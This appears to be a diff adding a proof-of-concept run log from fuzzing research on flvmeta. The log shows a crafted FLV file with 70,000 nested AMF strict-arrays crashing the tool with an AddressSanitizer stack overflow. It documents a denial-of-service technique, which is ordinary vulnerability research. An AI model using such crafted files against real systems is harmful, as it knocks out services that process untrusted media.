@@ -1,0 +1,20 @@
+[*] flvmeta VULN-001 PoC runner
+[*] Date: Mon Sep  7 07:41:05 PM +08 2026
+[*] Generating vuln_001.flv via gen.py...
+[*] Building AMF payload with 70000 nested strict-arrays...
+[*] AMF payload size: 350022 bytes
+[*] Total FLV size: 350050 bytes
+[+] Written to: /data/ylwang/non-textfuzz/target/_poc/flvmeta/src_dump_yaml_c/vuln_001.flv
+[*] FLV file size: 350050 bytes
+[*] Running: /data/ylwang/non-textfuzz/target/flvmeta/build_test/src/flvmeta /data/ylwang/non-textfuzz/target/_poc/flvmeta/src_dump_yaml_c/vuln_001.flv
+AddressSanitizer:DEADLYSIGNAL
+
+[!] flvmeta exited with code: 1
+
+[*] Checking ASAN log files...
+--- ASAN log: /tmp/asan_flvmeta_vuln001.1849313 ---
+==1849313==ERROR: AddressSanitizer: stack-overflow on address 0x7fffa06f4ff0 (pc 0x7fd8906de8c1 bp 0x000000000000 sp 0x7fffa06f4fe0 T0)
+SUMMARY: AddressSanitizer: stack-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_stackdepot.cpp:54 in __sanitizer::StackDepotNode::hash(__sanitizer::StackTrace const&)
+
+[*] Crash signal summary:
+[RESULT] CRASH DETECTED - stack overflow / SIGSEGV confirmed
